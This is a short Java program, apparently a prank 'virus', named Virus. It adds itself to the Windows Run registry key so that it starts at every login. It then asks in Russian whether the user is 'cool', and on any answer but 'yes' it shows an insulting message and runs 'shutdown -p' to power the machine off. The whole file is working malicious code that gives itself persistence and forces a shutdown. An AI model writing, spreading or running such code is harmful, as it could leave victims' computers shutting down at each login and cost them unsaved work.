import javax.swing.*;
import java.io.IOException;
public class Main {
    public static void main(String[] args) throws IOException {
        
        String Name = "Virus";
        String Address = "C:\\Users\\Anton\\Downloads\\Virus.jar";
String Komanda = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + Name + " \t REG_SZ /d \"" +Address;
Runtime.getRuntime().exec(Komanda);
String Otvet = JOptionPane.showInputDialog(null, "Ты крутой?");
if (Otvet.equals("да")) {
    JOptionPane.showMessageDialog(null, Otvet + "Правильно живи пока сволоч");

}
else{JOptionPane.showMessageDialog(null, Otvet + "Ну и хана тогда твоему компу, сволоч!!!");Runtime.getRuntime() .exec("shutdown -p");}

    }
}